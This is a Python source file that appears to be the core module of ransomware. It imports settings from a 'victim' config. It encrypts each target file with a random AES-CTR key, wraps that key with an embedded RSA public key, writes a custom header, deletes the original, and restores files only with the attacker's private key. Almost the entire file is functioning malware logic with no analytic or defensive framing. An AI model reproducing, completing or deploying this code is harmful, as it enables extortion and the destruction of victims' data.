from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import Counter
from Cryptodome.Random import get_random_bytes
import os
import struct

from config_victim import (
    ENCRYPTION_EXTENSION, AES_KEY_SIZE, MAX_RETRIES,
    validate_file_for_encryption, VICTIM_CONFIG,
    FILE_HEADER_MAGIC, FILE_FORMAT_VERSION, 
    AES_KEY_SIZE_PER_FILE, NONCE_SIZE, PUBLIC_KEY
)


def load_public_key_from_string():
   
    try:
        public_key = RSA.import_key(PUBLIC_KEY.strip())
        return public_key
    except Exception as e:
         # اومبعد ساهل
        return None

def load_private_key_from_string(private_key):
   
    try:
        private_key = RSA.import_key(private_key.strip())
        return private_key
    except Exception:
        return None




def build_file_header(encrypted_aes_key, encrypted_nonce, original_size):
    
    header = b''
    header += FILE_HEADER_MAGIC
    header += struct.pack('>H', FILE_FORMAT_VERSION)
    header += struct.pack('>H', 0)  # flags
    header += struct.pack('>I', len(encrypted_aes_key))
    header += struct.pack('>I', len(encrypted_nonce))
    header += struct.pack('>Q', original_size)
    header += encrypted_aes_key
    header += encrypted_nonce
    return header




def parse_file_header(encrypted_file_path):
    try:
        with open(encrypted_file_path, 'rb') as f:
            magic = f.read(4)
            if magic != FILE_HEADER_MAGIC:
                return None
            
            version = struct.unpack('>H', f.read(2))[0]
            flags = struct.unpack('>H', f.read(2))[0]
            aes_key_size = struct.unpack('>I', f.read(4))[0]
            nonce_size = struct.unpack('>I', f.read(4))[0]
            original_size = struct.unpack('>Q', f.read(8))[0]
            
            encrypted_aes_key = f.read(aes_key_size)
            encrypted_nonce = f.read(nonce_size)
            encrypted_data = f.read()
            
            return {
                'version': version,
                'encrypted_aes_key': encrypted_aes_key,
                'encrypted_nonce': encrypted_nonce,
                'original_size': original_size,
                'encrypted_data': encrypted_data
            }
    except Exception:
        return None






def encrypt_file_advanced(file_path, max_retries=MAX_RETRIES):
    
    original_file_size = 0
    
    try:
        if not validate_file_for_encryption(file_path):
            return False
        
       
        public_key = load_public_key_from_string()
        if not public_key:
            return False
        
        original_file_size = os.path.getsize(file_path)
        
        for attempt in range(max_retries + 1):
            try:
              
                file_aes_key = get_random_bytes(AES_KEY_SIZE_PER_FILE)
                file_nonce = get_random_bytes(NONCE_SIZE)
                
                
                counter = Counter.new(64, prefix=file_nonce)
                cipher = AES.new(file_aes_key, AES.MODE_CTR, counter=counter)
                
                with open(file_path, 'rb') as original_file:
                    file_data = original_file.read()
                
                encrypted_data = cipher.encrypt(file_data)
                
               
                cipher_rsa = PKCS1_OAEP.new(public_key)
                encrypted_aes_key = cipher_rsa.encrypt(file_aes_key)
                encrypted_nonce = cipher_rsa.encrypt(file_nonce)
                
              
                header = build_file_header(encrypted_aes_key, encrypted_nonce, original_file_size)
                encrypted_file_path = file_path + ENCRYPTION_EXTENSION
                
                with open(encrypted_file_path, 'wb') as encrypted_file:
                    encrypted_file.write(header)
                    encrypted_file.write(encrypted_data)
                
              
                os.remove(file_path)
                
                if verify_encryption_integrity(encrypted_file_path, original_file_size):
                    return True
                else:
                    raise ValueError("Encryption integrity check failed")
                    
            except Exception as attempt_error:
                if attempt == max_retries:
                    raise attempt_error
                continue
                
    except Exception as e:
        # اومبغد ساهل 
        return False
        
    finally:
     
        if 'file_aes_key' in locals():
            secure_delete(file_aes_key)
        if 'file_nonce' in locals():
            secure_delete(file_nonce)






def decrypt_file_advanced(encrypted_file_path, private_key_pem=None):

    try:
        file_data = parse_file_header(encrypted_file_path)
        if not file_data:
            return False
        
        if private_key_pem is None:
           # اومبعد ساهل 
            return False
        
      
        private_key = load_private_key_from_string(private_key_pem)
        if not private_key:
            return False
        
       
        cipher_rsa = PKCS1_OAEP.new(private_key)
        aes_key = cipher_rsa.decrypt(file_data['encrypted_aes_key'])
        nonce = cipher_rsa.decrypt(file_data['encrypted_nonce'])
        
        
        counter = Counter.new(64, prefix=nonce)
        cipher = AES.new(aes_key, AES.MODE_CTR, counter=counter)
        decrypted_data = cipher.decrypt(file_data['encrypted_data'])
        
        
        original_path = encrypted_file_path.replace(ENCRYPTION_EXTENSION, '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
      
        os.remove(encrypted_file_path)
        return True
        
    except Exception as e:
        
        return False
    

def verify_encryption_integrity(encrypted_file, original_size):
   
    try:
        file_data = parse_file_header(encrypted_file)
        if not file_data:
            return False
        
        encrypted_size = len(file_data['encrypted_data'])
        return encrypted_size == original_size
        
    except Exception:
        return False    






def cleanup_temp_files(file_list):
    for file_path in file_list:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception:
            continue




def secure_delete(data):
    if data:
        try:
            if isinstance(data, bytes):
                overwrite_data = get_random_bytes(len(data))
                del overwrite_data
            del data
        except Exception:
            pass